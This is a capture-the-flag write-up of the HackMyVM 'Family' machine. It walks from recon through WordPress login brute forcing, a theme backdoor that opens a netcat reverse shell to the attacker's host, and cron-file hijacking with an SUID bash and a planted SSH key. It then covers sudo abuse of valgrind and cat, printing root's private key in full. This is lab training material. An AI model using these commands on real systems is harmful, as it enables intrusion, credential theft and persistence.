# Family

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.199:22
Open 10.0.2.199:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.199
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:4e:fd:57:05:8f:d0:d6:1d:67:5d:6d:4e:b5:c9:fc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4pEntFYjhNQ+7x67HCMoAQuViBhKHmP11Z/fmq8foDERFE4YNzG2NnWeSI9QO1Tl0cx2DfRI41r7Radcej8F6TybRI+vpC2yeEJBWc0h1nXSjQpXZ0reUYSarXCTgfp4QmPfwSFz951BdZRgCPfN9QK9ja4GKDfFxudbLk+qD+XHqKU1aiCERxs7GGKWC69We9dFMnhG+W0zzrZz6qzBzXbjJL/9W1eKR63QY9/8MhOoOrPJOKSYjt30uR/uwg2W6pD6ILe+TSEQGexlMV/dHi+Cb717DI/3RxEmy1jZw/71lnniTDFYB4ffEBw9sZ24TG9SEMfeqqpWMXH5rYREx
|   256 d4:98:fb:a7:94:bd:0c:c6:a8:60:5b:bc:b9:c7:f4:51 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL0QDIMBdHXi+QuzwPAIoeqAQvafwYPngGJ41BdilKeNGboIWZ8OyKC1omTJpTF0ezE8t2c4Exp9fhkQDBzceLg=
|   256 fa:34:3a:25:74:40:99:fc:4f:60:be:db:7e:7f:93:be (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBbXRyw9p89DRcXfLut4rMuOwuGAupVhxSDMvqVc0xco
80/tcp open  http    syn-ack Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2020-02-06 07:33  wordpress/
|_
|_http-title: Index of /
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## Wordpress

![writeup.png](/assets/pentest/hackmyvm/family/writeup.png)

In HTML most links were using `wordpress` as domain so I added it to my hosts

![writeup-1.png](/assets/pentest/hackmyvm/family/writeup-1.png)

```bash
└─$ docker run -it --network host --rm wpscanteam/wpscan --url http://family/wordpress/ -e vp,u
[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://family/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://family/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.9.1 identified (Latest, released on 2026-02-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://family/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.9.1</generator>
 |  - http://family/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.9.1</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://family/wordpress/wp-content/themes/twentytwentyone/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://family/wordpress/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.7
 | Style URL: http://family/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.3
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://family/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://family/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

```bash
└─$ nuclei -u http://family/wordpress/ -tags wordpress
[wordpress-akismet:outdated_version] [http] [info] http://family/wordpress/wp-content/plugins/akismet/readme.txt ["4.1.9"] [last_version="5.5"]
[wordpress-xmlrpc-listmethods] [http] [info] http://family/wordpress/xmlrpc.php
[wordpress-directory-listing] [http] [info] http://family/wordpress/wp-content/uploads/
[wordpress-directory-listing] [http] [info] http://family/wordpress/wp-includes/
[wp-xmlrpc-pingback-detection] [http] [info] http://family/wordpress/xmlrpc.php
[wp-license-file] [http] [info] http://family/wordpress/license.txt
[wordpress-readme-file] [http] [info] http://family/wordpress/readme.html
[wordpress-detect:version_by_css] [http] [info] http://family/wordpress/wp-admin/install.php ["6.9.1"]
[wordpress-login] [http] [info] http://family/wordpress/wp-login.php
[wordpress-xmlrpc-detect] [http] [info] http://family/wordpress/xmlrpc.php
```

No CVE's or exploits for this version.

Bruteforce password?
```bash
└─$ ffuf -u 'http://family/wordpress/wp-login.php' \
    -d 'log=admin&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2Ffamily%2Fwordpress%2Fwp-admin%2F&testcookie=1' \
    -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt  \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Cookie: wordpress_test_cookie=WP+Cookie+check; wp_lang=en_US' \
    -mc 302 -t 1
phantom                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 393ms]
```

Edit theme with custom backdoor

![writeup-2.png](/assets/pentest/hackmyvm/family/writeup-2.png)

```bash
└─$ curl 'http://family/wordpress/index.php/hello' --data-urlencode '0=busybox nc 10.0.2.149 4444 -e /bin/bash'
---
└─$ penelope -p 4444
www-data@family:/var/www/html/wordpress$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement (father)

```bash
www-data@family:/var/www/html/wordpress$ cat wp-config.php  | grep define
define( 'DB_NAME', 'wordpress_db' );
define( 'DB_USER', 'admin' );
define( 'DB_PASSWORD', 'phantom' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8mb4' );
...
```

```bash
www-data@family:/var/www$ cat .bash_history
export TERM=xterm
clear
cd /home
ls
cd baby
cd mother
cd father
clear
find / -group www-data -type f 2>/dev/null | grep -v /var/www
find / -group www-data -type f 2>/dev/null | grep -v -E "/var/www|proc"
cat /usr/share/perl/5.28.1/perso.txt
ls -l /usr/share/perl/5.28.1/perso.txt
su - father
export TERM=xterm
clear
sudo -l
```

```bash
www-data@family:/var/www$ cat /usr/share/perl/5.28.1/perso.txt
uncrackablepassword
```

::: tip Creds
`father:uncrackablepassword`
:::

## Lateral Movement (mother)

No other ports open, no cronjobs for this user, no suids, no sudo. Check for cronjobs globally?
```bash
└─$ sshpass -p 'uncrackablepassword' scp /opt/scripts/enum/pspy64 father@10.0.2.199:/tmp
└─$ sshpass -p 'uncrackablepassword' ssh father@10.0.2.199
father@family:~$ /tmp/pspy
...
2026/02/12 14:58:01 CMD: UID=0     PID=2312   | /usr/sbin/CRON -f
2026/02/12 14:58:01 CMD: UID=1001  PID=2313   | /bin/sh -c python ~/check.py
...
```

We can write to the python file
```bash
father@family:~$ cat /home/mother/check.py
cat: /home/mother/check.py: No such file or directory
father@family:~$ echo x > /home/mother/check.py
father@family:~$ echo $'import os;os.system("/tmp/auth")' > /home/mother/check.py
```

```bash
└─$ gen_ssh_deploy id_rsa mother
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
mkdir -p /home/mother/.ssh ; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID++U7Ue2KpP+ld1K5VFT7vRMd8eBv66X26b8kfq554M woyag@kraken' >> /home/mother/.ssh/authorized_keys ; chmod 700 /home/mother/.ssh ; chmod 600 /home/mother/.ssh/authorized_keys
```

```bash
father@family:~$ nano /tmp/auth
install -m4777 /bin/bash /tmp/motherbash
SSH_DEPLOY_CMD
chown -R mother:mother /home/mother
```

Include SUID bash in case something goes wrong :D
```bash
father@family:~$ /tmp/motherbash -p
motherbash-5.0$ id
uid=1000(father) gid=1000(father) euid=1001(mother) groups=1000(father),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

This took longer then it should have, reverse shell would have been quicker. SSH won't work unless permissions are satisfied, this includes your home directory owned by you and you only, no one else; or it fails.
```bash
└─$ ssh -i id_rsa mother@10.0.2.199
mother@family:~$ id
uid=1001(mother) gid=1001(mother) groups=1001(mother)
```

## Lateral Movement (baby)

```bash
mother@family:~$ sudo -l
Matching Defaults entries for mother on family:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mother may run the following commands on family:
    (baby) NOPASSWD: /usr/bin/valgrind
```

```bash
mother@family:~$ sudo -u baby valgrind /bin/bash
==2671== Memcheck, a memory error detector
==2671== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.
==2671== Using Valgrind-3.14.0 and LibVEX; rerun with -h for copyright info
==2671== Command: /bin/bash
==2671==
id
^C
^[[Abash-5.0$ ^C
bash-5.0$ ^C
bash-5.0$ id
uid=1002(baby) gid=1002(baby) groups=1002(baby)
```

### User.txt

```bash
baby@family:~$ cat user.txt
Chilatyfile
```

## Lateral Movement (root)

```bash
baby@family:~$ sudo -l
Matching Defaults entries for baby on family:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User baby may run the following commands on family:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
```

SSH key is accessible
```bash
baby@family:~$ sudo cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAnbuWFqguL1RgxPF2kO1Fv1pC4BIFjxOp+ATX3k4WvuJyEdrcAFB5
esn89B6TTKjBffemI/Ppb6/KQ+RXjgh5ZtEzxmRHhO9v9OAcXm76M/0wmG49v+nD79y53b
KFMjcsqwvHZXjn4b3Wk1myQTC2sP763UNfBfd5ZH9uViBqT3NZQNrmzV8V534fZsGeHsMf
vvdbU5yRWlQIHypurKs5jKtwXnRJqpTnDkics2SBcqaL+1ivwZIyNlBvdS7YZBoxRasLG5
3UKg4SIc9K3ujdYtCDYYSGjRxHQLIDRx1wGDo4Bn3jBbZsHqT6A3mpx367jx08WHlcy+eb
hGyuXtnBrwAAA8CBizlZgYs5WQAAAAdzc2gtcnNhAAABAQCdu5YWqC4vVGDE8XaQ7UW/Wk
LgEgWPE6n4BNfeTha+4nIR2twAUHl6yfz0HpNMqMF996Yj8+lvr8pD5FeOCHlm0TPGZEeE
72/04Bxebvoz/TCYbj2/6cPv3LndsoUyNyyrC8dleOfhvdaTWbJBMLaw/vrdQ18F93lkf2
5WIGpPc1lA2ubNXxXnfh9mwZ4ewx++91tTnJFaVAgfKm6sqzmMq3BedEmqlOcOSJyzZIFy
pov7WK/BkjI2UG91LthkGjFFqwsbndQqDhIhz0re6N1i0INhhIaNHEdAsgNHHXAYOjgGfe
MFtmwepPoDeanHfruPHTxYeVzL55uEbK5e2cGvAAAAAwEAAQAAAQBKCYUXuXWETczmZJjM
yjLU8N83If5t/ELp4gwZkvnmO5BjhSGDHEMJOcp8I+XsM8IvCJF5isHl5NPCLmpShvPFKS
luVB+l7GXWwWNPiDP1N0EaK5TcgjOwYSD1SRhwS6mx1+OOY8QkF+GiZJXhN6ZpSiYiub7e
pBzc6Vu3HZwJElUCvAuCxDbazc+RUT9VzH2BdQ3w1D66T8c3ruuRD8P86s0zf7/Bo/OmBi
YeT/X3QcjyZTgmPjBR/m7nZNVUaDgWMCzIx2OecXX2bhdIVnpgVZVSq+EpidgvOPa/bjfQ
AXB5vEuQ7lGz15Hx2isz5ai/zAKIGY33omnDT3f4ESvRAAAAgCkSIIvDtArb/6jXQb57In
aExbm6PurE05TEHj/COnGSjD0iWk6CFFs33ud1A4FX1ACEVkEh51KBukSGhOXHd/nAH56i
pL4h5vmyt3JqLlilSkRju2oOH1I5edxIbTHD5aFHssD3l2OSaO4ax/h42BVp+Xr63FdDbS
NV8qd9gYp7AAAAgQDM02e+O6t1J+X41VaGRuJTnYCfWXKA5KnmmDM5UKQHm4i0dXL9xWgE
bBrFggoE2XsowMLRGOPe0ijuXOkgkpCeSB/rxmQ+Nn2x2O/H7yoIgl1IbpNIK6EZTaCebC
lfdn0hK55BSl394ql0y4ns91E4XL0Xvc9RDlBvGF5BAd/KwwAAAIEAxSQf51F5oIYIvl4l
9y3g77L+VlV0Yg9iLunUT/km9abp9e2oTsNXN3e9IHja5GVxOUjhlBC8Yposlv/oaAApJu
KC9XLqjqEmpo5gq61fG0HRPOkt1DKNuR3zIrWHot0DificHPyGISeu1/oR8tr9OR6Hmlvh
+AY4rKYqqUj+hqUAAAALcm9vdEBmYW1pbHk=
-----END OPENSSH PRIVATE KEY-----
```

```bash
└─$ nano id_rsa.root
└─$ chmod 600 id_rsa.root
└─$ ssh -i id_rsa.root root@10.0.2.199


                          oooo$$$$$$$$$$$$oooo
                      oo$$$$$$$$$$$$$$$$$$$$$$$$o
                   oo$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o         o$   $$ o$
   o $ oo        o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o       $$ $$ $$o$
oo $ $ "$      o$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$o       $$$o$$o$
"$$$$$$o$     o$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$o    $$$$$$$$
  $$$$$$$    $$$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$$$$$$$$$$$$$$
  $$$$$$$$$$$$$$$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$$$$$$  """$$$
   "$$$""""$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$
    $$$   o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$o
   o$$"   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       $$$o
   $$$    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" "$$$$$$ooooo$$$$o
  o$$$oooo$$$$$  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$   o$$$$$$$$$$$$$$$$$
  $$$$$$$$"$$$$   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     $$$$""""""""
 """"       $$$$    "$$$$$$$$$$$$$$$$$$$$$$$$$$$$"      o$$$
            "$$$o     """$$$$$$$$$$$$$$$$$$"$$"         $$$
              $$$o          "$$""$$$$$$""""           o$$$
               $$$$o                 oo             o$$$"
                "$$$$o      o$$$$$$o"$$$$o        o$$$$
                  "$$$$$oo     ""$$$$o$$$$$o   o$$$$""
                     ""$$$$$oooo  "$$$o$$$$$$$$$"""
                        ""$$$$$$$oo $$$$$$$$$$
                                """"$$$$$$$$$$$
                                    $$$$$$$$$$$$
                                     $$$$$$$$$$"
                                      "$$$""""
```

Can't exactly SSH :(

Minimize your terminal so **pager** will be triggered, use `!bash` to spawn shell.

![writeup-3.png](/assets/pentest/hackmyvm/family/writeup-3.png)

### Root.txt

```bash
root@family:~# cat /root/last_flag.txt
Selmorbormir
```